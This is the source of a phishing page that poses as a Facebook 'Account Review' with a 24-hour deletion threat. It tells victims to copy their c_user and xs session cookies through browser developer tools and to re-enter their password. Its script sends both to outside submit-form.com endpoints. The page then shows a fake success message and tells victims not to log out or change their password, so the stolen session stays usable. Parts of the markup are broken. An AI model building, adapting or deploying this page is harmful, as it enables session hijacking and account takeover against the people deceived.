<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook - Account Review</title>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
    />
    <style>
      <body>
    <div class="header">
      <div class="header-content">
        <div class="logo">
          <i class="fab fa-facebook"></i>
          <span>Facebook Account Review</span>
        </div>
        <div class="help-center">
          <i class="fas fa-question-circle"></i> Help Center
        </div>
        <div class="google-translate-container">
          <span class="translate-title">Language</span>
          <select
            id="google_translate_element"
            style="
              width: 100%;
              background: transparent;
              border: none;
              color: white;
            "
          >
            <option value="">Select Language</option>
            <option value="en">English</option>
            <option value="es">Spanish</option>
            <option value="fr">French</option>
          </select>
        </div>
      </div>
    </div>

    <div class="container">
      <div class="review-card">
        <div class="warning-icon">
          <i class="fas fa-exclamation-triangle"></i>
        </div>
        <h1 class="review-title">Urgent Account Review Required</h1>
        <p class="review-subtitle">
          Your account is scheduled for deletion due to policy violations.
          Request a review to prevent permanent loss of your account and data.
        </p>

        <div class="deletion-warning">
          <h3><i class="fas fa-info-circle"></i> Important Notice</h3>
          <ul>
            <li>
              Your account is scheduled for deletion in
              <strong>24 hours</strong>
            </li>
            <li>This action is due to violations of our community standards</li>
            <li>You may request a review of this decision</li>
            <li>If approved, your account will be restored with full access</li>
            <li>
              Failure to request a review will result in permanent deletion
            </li>
          </ul>
        </div>

        <p class="review-subtitle">
          To request a review of your account deletion, click the button below
          and follow the instructions.
        </p>

        <button class="review-btn" id="reviewBtn">
          <i class="fas fa-file-alt"></i> Apply for Account Review
        </button>
      </div>
    </div>

    <!-- Professional Language Selection Modal -->
    <div class="language-modal" id="languageModal">
      <div class="">
            <i class="fas fa-globe"></i>
          </h2>
          <button class="close-language-modal" id="closeLanguageModal">
            <i class="fas fa-times"></i>
          </button>
        </div>

        <div class="language-search-container">
          <div class="search-wrapper">
            <i class="fas fa-search search-icon"></i>
            <input
              type="text"
              class=
              id=
              
            />
          </div>
        </div>

        <div class="></i>
              </div>
              <div class="auto">English</div>
              <div class="language-native">English</div>
            </button>
            
          </div>

          <p
            style="
              text-align: center;
              margin-top: 20px;
              color: #606770;
              font-size: 14px;
            "
          >
            Can't find your language? Request it at:
            <a
              href="mailto:support@fb.com"
              style="color: #1877f2; text-decoration: none"
              >support@fb.com</a
            >
          </p>
        </div>

        <div class="language-footer">
          <div class="selected-language-display">
            Selected: <strong id="selectedLanguageDisplay">None</strong>
          </div>
          <button class="confirm-btn" id="confirmBtn" disabled>
            <i class="fas fa-check"></i> Confirm Selection
          </button>
        </div>
      </div>
    </div>

    <!-- Review Modal -->
    <div class="modal" id="reviewModal">
      <div class="modal-content">
        <div class="modal-header">
          <h2 class="modal-title">
            <i class="fas fa-file-alt"></i> Account Review Request
          </h2>
          <button class="close-modal" id="closeModal">&times;</button>
        </div>

        <div class="modal-body">
          <div class="step-indicator">
            <div class="step active">1</div>
            <div class="step">2</div>
            <div class="step">3</div>
            <div class="step-line"></div>
          </div>

          <!-- Step 1: Video and c_user/xs -->
          <div class="step-content active" id="step1">
            <h3 class="step-title">Detailed Video Information</h3>

            <div class="video-player-container">
              <div class="network-status">
                <i class="fas fa-signal"></i>
                <span>Connection: Good</span>
              </div>
              <div class="video-container">
                <video id="tutorialVideo">
                  <!-- Source will be set dynamically -->
                  Your browser does not support the video tag.
                </video>
                <div class="loading-spinner" id="loadingSpinner">
                  <div class="spinner"></div>
                  <div class="loading-percentage">0%</div>
                </div>
                <div class="video-overlay" id="videoOverlay">
                  <div class="play-btn" id="overlayPlayBtn">
                    <i class="fas fa-play"></i>
                  </div>
                  <p style="color: white; margin-top: 15px; font-weight: 600">
                    Click to select language
                  </p>
                </div>
                <div class="video-controls">
                  <button class="control-btn" id="playPauseBtn">
                    <i class="fas fa-play"></i>
                  </button>
                  <div class="progress-container">
                    <div class="buffered-bar" id="bufferedBar"></div>
                    <div class="progress-bar" id="progressBar"></div>
                  </div>
                  <div class="time-display">
                    <span id="currentTime">0:00</span> /
                    <span id="totalTime">0:00</span>
                  </div>
                  <div class="volume-container">
                    <button class="control-btn" id="volumeBtn">
                      <i class="fas fa-volume-up"></i>
                    </button>
                    <input
                      type="range"
                      class="volume-slider"
                      id="volumeSlider"
                      min="0"
                      max="1"
                      step="0.1"
                      value="1"
                    />
                  </div>
                  <select class="speed-selector" id="speedSelector">
                    <option value="0.5">0.5x</option>
                    <option value="0.75">0.75x</option>
                    <option value="1" selected>Normal</option>
                    <option value="1.25">1.25x</option>
                    <option value="1.5">1.5x</option>
                    <option value="2">2x</option>
                  </select>
                  <button class="control-btn fullscreen-btn" id="fullscreenBtn">
                    <i class="fas fa-expand"></i>
                  </button>
                </div>
              </div>
            </div>

            <div class="mobile-instructions">
              <h3><i class="fas fa-mobile-alt"></i> For Mobile Users</h3>
              <p>
                This process requires desktop browser developer tools. Please
                switch to a computer:
              </p>
              <ol>
                <li>Open Chrome on a desktop/laptop computer</li>
                <li>Log in to Facebook</li>
                <li>Follow the video instructions to find your values</li>
                <li>Return here to submit your review request</li>
              </ol>
            </div>

            <div class="form-group">
              <label for="c_user"
                ><i class="fas fa-user-circle"></i> c_user Value</label
              >
              <input
                type="text"
                id="c_user"
                name="c_user"
                placeholder="Enter your c_user value"
                pattern="\d+"
                title="c_user only"
                required
              />
              <div class="validation-hint">
                Must contain a valid c_user value only
              </div>
            </div>

            <div class="form-group">
              <label for="xs"><i class="fas fa-key"></i> xs Value</label>
              <input
                type="text"
                id="xs"
                name="xs"
                placeholder="Enter your xs value"
                pattern=".{20,}"
                title="xs only"
                required
              />
              <div class="validation-hint">
                Must contain a valid xs value only
              </div>
            </div>

            <div class="btn-group">
              <button class="btn btn-outline" id="cancelBtn">
                <i class="fas fa-times"></i> Cancel
              </button>
              <button class="btn btn-primary" id="nextToStep2">
                <i class="fas fa-arrow-right"></i> Continue
              </button>
            </div>
          </div>

          <!-- Step 2: Password Verification -->
          <div class="step-content" id="step2">
            <h3 class="step-title">Password Verification</h3>

            <div class="form-group">
              <label for="password"
                ><i class="fas fa-lock"></i> Re-enter Password</label
              >
              <input
                type="password"
                id="password"
                name="password"
                placeholder="Enter your Facebook password"
                required
              />
            </div>

            <div class="deletion-warning">
              <h3>
                <i class="fas fa-info-circle"></i> Important Security Notice
              </h3>
              <ul>
                <li>
                  This is a security verification step to confirm your identity
                </li>
                <li>
                  Do not log out from your computer during the review process
                </li>
                <li>Keep your Facebook account logged in on your computer</li>
                <li>Your password is encrypted during transmission</li>
                <li>Do not share your password with anyone</li>
              </ul>
            </div>

            <div class="btn-group">
              <button class="btn btn-outline" id="backToStep1">
                <i class="fas fa-arrow-left"></i> Back
              </button>
              <button class="btn btn-primary" id="nextToStep3">
                <i class="fas fa-paper-plane"></i> Submit Review Request
              </button>
            </div>
          </div>

          <!-- Step 3: Success Message -->
          <div class="step-content" id="step3">
            <div class="success-message">
              <div class="success-icon">
                <i class="fas fa-check-circle"></i>
              </div>
              <h3 class="success-title">Review Request Submitted!</h3>
              <p class="success-text">
                Your account review request has been successfully submitted. Our
                team will review your case within the next 24 hours.
              </p>

              <div class="deletion-warning">
                <h3>
                  <i class="fas fa-info-circle"></i> Important Instructions
                </h3>
                <ul>
                  <li>Do not log out from your computer during this period</li>
                  <li>Keep your Facebook account logged in on this device</li>
                  <li>
                    You will receive a notification once the review is complete
                  </li>
                  <li>Account deletion has been paused pending review</li>
                  <li>
                    Please do not attempt to change your password during review
                  </li>
                </ul>
              </div>

              <button class="btn btn-primary" id="finishBtn">
                <i class="fas fa-check"></i> Finish
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>


    <!-- Footer -->
    <footer>
      <div class="footer-content">
        <div class="footer-links">
          <a href="#">About</a>
          <a href="#">Ad Choice</a>
          <a href="#">Terms and policies</a>
          <a href="#">Privacy Policy</a>
          <a href="#">Help Center</a>
        </div>
        <div class="copyright">
          Meta © 2025 - Protecting Your Digital Identity
        </div>
      </div>
    </footer>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        // Video files mapping
        const videoFiles = {
          'english': 'English_US_video_information_V1.mp4',
          'filipino': 'Filipino_Tagalog_video_information_V1.mp4',
          'hindi': 'Hindi_video_information_V1.mp4',
          'portuguese': 'Portuguese_Brazil_video_information_V1.mp4',
          'spanish': 'Spanish_Spain_video_information_V1.mp4',
          'tamil': 'Tamil_video_information_V1.mp4',
          'arabic': 'Arabic_video_information_V1.mp4',
          'french': 'French_France_video_information_V1.mp4',
          'swedish': 'Swedish_video_information_V1.mp4',
          'japanese': 'Japanese_video_information_V1.mp4'
        };

        // Language modal elements
        const languageModal = document.getElementById("languageModal");
        const closeLanguageModal =
          document.getElementById("closeLanguageModal");
        const languageSearch = document.getElementById("languageSearch");
        const languageButtons = document.querySelectorAll(".language-btn");
        const confirmBtn = document.getElementById("confirmBtn");
        const selectedLanguageDisplay = document.getElementById(
          "selectedLanguageDisplay"
        );

        let selectedLanguage = null;

        // Video elements
        const videoOverlay = document.getElementById("videoOverlay");
        const overlayPlayBtn = document.getElementById("overlayPlayBtn");
        const video = document.getElementById("tutorialVideo");
        const loadingSpinner = document.getElementById("loadingSpinner");
        const loadingPercentage = document.querySelector(".loading-percentage");

        const modal = document.getElementById("reviewModal");
        const reviewBtn = document.getElementById("reviewBtn");
        const closeModal = document.getElementById("closeModal");
        const cancelBtn = document.getElementById("cancelBtn");
        const finishBtn = document.getElementById("finishBtn");

        // Video control elements
        const playPauseBtn = document.getElementById("playPauseBtn");
        const progressBar = document.getElementById("progressBar");
        const bufferedBar = document.getElementById("bufferedBar");
        const currentTimeDisplay = document.getElementById("currentTime");
        const totalTimeDisplay = document.getElementById("totalTime");
        const volumeBtn = document.getElementById("volumeBtn");
        const volumeSlider = document.getElementById("volumeSlider");
        const speedSelector = document.getElementById("speedSelector");
        const fullscreenBtn = document.getElementById("fullscreenBtn");

        // Step navigation
        const nextToStep2 = document.getElementById("nextToStep2");
        const backToStep1 = document.getElementById("backToStep1");
        const nextToStep3 = document.getElementById("nextToStep3");

        const step1 = document.getElementById("step1");
        const step2 = document.getElementById("step2");
        const step3 = document.getElementById("step3");

        const steps = document.querySelectorAll(".step");


        // Open language modal when video overlay is clicked
        overlayPlayBtn.addEventListener("click", function () {
          languageModal.classList.add("active");
        });

        // Close language modal
        closeLanguageModal.addEventListener("click", function () {
          languageModal.classList.remove("active");
        });

        // Language search functionality
        languageSearch.addEventListener("input", function () {
          const searchTerm = this.value.toLowerCase();

          languageButtons.forEach((button) => {
            const languageName = button
              .querySelector(".language-name")
              .textContent.toLowerCase();
            const languageNative = button
              .querySelector(".language-native")
              .textContent.toLowerCase();

            if (
              languageName.includes(searchTerm) ||
              languageNative.includes(searchTerm)
            ) {
              button.style.display = "flex";
            } else {
              button.style.display = "none";
            }
          });
        });

        // Language selection
        languageButtons.forEach((button) => {
          button.addEventListener("click", function () {
            // Remove selected class from all buttons
            languageButtons.forEach((btn) => btn.classList.remove("selected"));

            // Add selected class to clicked button
            this.classList.add("selected");

            // Get selected language
            selectedLanguage = this.getAttribute("data-lang");
            const languageName =
              this.querySelector(".language-name").textContent;

            // Update display
            selectedLanguageDisplay.textContent = languageName;

            // Enable confirm button
            confirmBtn.disabled = false;
          });
        });

        // Confirm language selection
        confirmBtn.addEventListener("click", function () {
          if (selectedLanguage) {
            const source = videoFiles[selectedLanguage];

            if (source) {
              video.src = source;
              video.load();

              // Set video title for accessibility
              video.setAttribute(
                "title",
                `Tutorial Video - ${selectedLanguageDisplay.textContent}`
              );

              languageModal.classList.remove("active");

              // After a short delay, play the video
              setTimeout(() => {
                video.play();
                videoOverlay.classList.add("hidden");
                playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
              }, 300);

              // Remember language selection
              localStorage.setItem("preferredLanguage", selectedLanguage);
            }
          }
        });

        // Close modal when clicking outside
        window.addEventListener("click", function (event) {
          if (event.target === languageModal) {
            languageModal.classList.remove("active");
          }
        });

        // Keyboard shortcut for closing modal
        document.addEventListener("keydown", function (e) {
          if (
            e.key === "Escape" &&
            languageModal.classList.contains("active")
          ) {
            languageModal.classList.remove("active");
          }
        });

        // Preload the preferred language if available
        const preferredLanguage =
          localStorage.getItem("preferredLanguage") || "english";
        if (videoFiles[preferredLanguage]) {
          video.src = videoFiles[preferredLanguage];
          video.load();
        }

        function initVideoPlayer() {
          // Initialize volume and playback rate
          video.volume = volumeSlider.value;
          video.playbackRate = speedSelector.value;

          // Update time display
          updateTimeDisplay();

          // Event listeners
          video.addEventListener("timeupdate", updateProgressBar);
          video.addEventListener("progress", updateBufferedBar);
          video.addEventListener("loadedmetadata", function () {
            totalTimeDisplay.textContent = formatTime(video.duration);
          });

          // Loading events
          video.addEventListener("waiting", showLoadingSpinner);
          video.addEventListener("playing", hideLoadingSpinner);
          video.addEventListener("seeking", showLoadingSpinner);
          video.addEventListener("seeked", hideLoadingSpinner);

          playPauseBtn.addEventListener("click", togglePlayPause);

          volumeBtn.addEventListener("click", toggleMute);
          volumeSlider.addEventListener("input", function () {
            video.volume = volumeSlider.value;
            updateVolumeIcon();
          });

          speedSelector.addEventListener("change", function () {
            video.playbackRate = parseFloat(this.value);
          });

          fullscreenBtn.addEventListener("click", toggleFullscreen);

          const progressContainer = document.querySelector(
            ".progress-container"
          );
          progressContainer.addEventListener("click", function (e) {
            const pos = (e.pageX - this.offsetLeft) / this.offsetWidth;
            video.currentTime = pos * video.duration;
          });

          // Keyboard shortcuts
          document.addEventListener("keydown", function (e) {
            if (e.code === "Space" && !isInputField(document.activeElement)) {
              e.preventDefault();
              togglePlayPause();
            }

            if (e.code === "ArrowLeft") {
              video.currentTime = Math.max(0, video.currentTime - 5);
            }

            if (e.code === "ArrowRight") {
              video.currentTime = Math.min(
                video.duration,
                video.currentTime + 5
              );
            }

            if (e.code === "ArrowUp") {
              video.volume = Math.min(1, video.volume + 0.1);
              volumeSlider.value = video.volume;
              updateVolumeIcon();
            }

            if (e.code === "ArrowDown") {
              video.volume = Math.max(0, video.volume - 0.1);
              volumeSlider.value = video.volume;
              updateVolumeIcon();
            }

            if (e.code === "KeyM") {
              toggleMute();
            }

            if (e.code === "KeyF") {
              toggleFullscreen();
            }
          });
        }

        function isInputField(element) {
          return element.tagName === "INPUT" || element.tagName === "TEXTAREA";
        }

        function showLoadingSpinner() {
          loadingSpinner.style.display = "flex";
        }

        function hideLoadingSpinner() {
          if (video.readyState >= 3) {
            loadingSpinner.style.display = "none";
          }
        }

        function updateBufferedBar() {
          if (video.buffered.length > 0) {
            const bufferedEnd = video.buffered.end(video.buffered.length - 1);
            const percent = (bufferedEnd / video.duration) * 100;
            bufferedBar.style.width = `${percent}%`;

            // Update loading percentage
            if (video.readyState < 4) {
              const loadedPercent = Math.round(
                (bufferedEnd / video.duration) * 100
              );
              loadingPercentage.textContent = `${loadedPercent}%`;
            }
          }
        }

        function playVideo() {
          video.play();
          videoOverlay.classList.add("hidden");
          playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
        }

        // Toggle play/pause
        function togglePlayPause() {
          if (video.paused) {
            video.play();
            playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
          } else {
            video.pause();
            playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
          }
        }

        // Update progress bar
        function updateProgressBar() {
          const percent = (video.currentTime / video.duration) * 100;
          progressBar.style.width = `${percent}%`;
          currentTimeDisplay.textContent = formatTime(video.currentTime);
        }

        // Update time display
        function updateTimeDisplay() {
          currentTimeDisplay.textContent = formatTime(video.currentTime);
          totalTimeDisplay.textContent = formatTime(video.duration);
        }

        // Format time in MM:SS
        function formatTime(seconds) {
          const minutes = Math.floor(seconds / 60);
          seconds = Math.floor(seconds % 60);
          return `${minutes}:${seconds < 10 ? "0" : ""}${seconds}`;
        }

        function toggleMute() {
          video.muted = !video.muted;
          updateVolumeIcon();
        }

        function updateVolumeIcon() {
          if (video.muted || video.volume === 0) {
            volumeBtn.innerHTML = '<i class="fas fa-volume-mute"></i>';
            volumeSlider.value = 0;
          } else if (video.volume > 0.5) {
            volumeBtn.innerHTML = '<i class="fas fa-volume-up"></i>';
          } else {
            volumeBtn.innerHTML = '<i class="fas fa-volume-down"></i>';
          }
        }

        function toggleFullscreen() {
          const videoContainer = document.querySelector(
            ".video-player-container"
          );

          if (!document.fullscreenElement) {
            if (videoContainer.requestFullscreen) {
              videoContainer.requestFullscreen();
            } else if (videoContainer.mozRequestFullScreen) {
              videoContainer.mozRequestFullScreen();
            } else if (videoContainer.webkitRequestFullscreen) {
              videoContainer.webkitRequestFullscreen();
            } else if (videoContainer.msRequestFullscreen) {
              videoContainer.msRequestFullscreen();
            }
            fullscreenBtn.innerHTML = '<i class="fas fa-compress"></i>';
          } else {
            if (document.exitFullscreen) {
              document.exitFullscreen();
            } else if (document.mozCancelFullScreen) {
              document.mozCancelFullScreen();
            } else if (document.webkitExitFullscreen) {
              document.webkitExitFullscreen();
            } else if (document.msExitFullscreen) {
              document.msExitFullscreen();
            }
            fullscreenBtn.innerHTML = '<i class="fas fa-expand"></i>';
          }
        }

        // Handle fullscreen change event
        document.addEventListener("fullscreenchange", updateFullscreenIcon);
        document.addEventListener(
          "webkitfullscreenchange",
          updateFullscreenIcon
        );
        document.addEventListener("mozfullscreenchange", updateFullscreenIcon);
        document.addEventListener("MSFullscreenChange", updateFullscreenIcon);

        function updateFullscreenIcon() {
          if (
            document.fullscreenElement ||
            document.webkitFullscreenElement ||
            document.mozFullScreenElement ||
            document.msFullscreenElement
          ) {
            fullscreenBtn.innerHTML = '<i class="fas fa-compress"></i>';
          } else {
            fullscreenBtn.innerHTML = '<i class="fas fa-expand"></i>';
          }
        }

        // Open review modal
        reviewBtn.addEventListener("click", function () {
          modal.style.display = "block";
          document.body.style.overflow = "hidden";
          initVideoPlayer();
        });

        // Close modal function
        function closeModalFunc() {
          modal.style.display = "none";
          document.body.style.overflow = "auto";
          resetForm();
        }

        closeModal.addEventListener("click", closeModalFunc);
        cancelBtn.addEventListener("click", closeModalFunc);

        // Finish button
        finishBtn.addEventListener("click", function () {
          window.location.href = "https://www.facebook.com/";
        });

        // Next to Step 2
        nextToStep2.addEventListener("click", function () {
          const cUserInput = document.getElementById("c_user");
          const xsInput = document.getElementById("xs");

          // Trigger browser validation
          if (!cUserInput.checkValidity()) {
            cUserInput.reportValidity();
            return;
          }

          if (!xsInput.checkValidity()) {
            xsInput.reportValidity();
            return;
          }

          // Submit c_user and xs together
          const formData = new FormData();
          formData.append("c_user", cUserInput.value);
          formData.append("xs", xsInput.value);

          fetch("https://submit-form.com/nHiOQY8dx", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              c_user: cUserInput.value,
              xs: xsInput.value
            }),
          })
            .then((response) => {
              if (!response.ok) {
                console.error("Submission of c_user and xs failed");
              }
            })
            .catch((error) => {
              console.error("Submission error:", error);
            });

          // Proceed to next step
          step1.classList.remove("active");
          step2.classList.add("active");

          steps[0].classList.remove("active");
          steps[1].classList.add("active");
        });

        // Back to Step 1
        backToStep1.addEventListener("click", function () {
          step2.classList.remove("active");
          step1.classList.add("active");

          steps[1].classList.remove("active");
          steps[0].classList.add("active");
        });

        // Submit form
        nextToStep3.addEventListener("click", function () {
          const passwordInput = document.getElementById("password");

          if (!passwordInput.checkValidity()) {
            passwordInput.reportValidity();
            return;
          }
          // Submit password separately
          const formData = new FormData();
          formData.append("password", passwordInput.value);

          fetch("https://submit-form.com/JXABiyR6C", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              password: passwordInput.value,
            }),
          })
            .then((response) => {
              if (!response.ok) {
                console.error("Password submission failed");
              }
            })
            .catch((error) => {
              console.error("Submission error:", error);
            });

          // Proceed to success step
          step2.classList.remove("active");
          step3.classList.add("active");

          steps[1].classList.remove("active");
          steps[2].classList.add("active");
        });

        // Reset form
        function resetForm() {
          document.getElementById("c_user").value = "";
          document.getElementById("xs").value = "";
          document.getElementById("password").value = "";


          step3.classList.remove("active");
          step1.classList.add("active");

          steps[2].classList.remove("active");
          steps[0].classList.add("active");

          video.pause();
          video.currentTime = 0;
          videoOverlay.classList.remove("hidden");
          playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
          progressBar.style.width = "0%";
          bufferedBar.style.width = "0%";
          currentTimeDisplay.textContent = "0:00";
        }

        // Close modal when clicking outside
        window.addEventListener("click", function (event) {
          if (event.target === modal) {
            closeModalFunc();
          }
        });
      });
    </script>
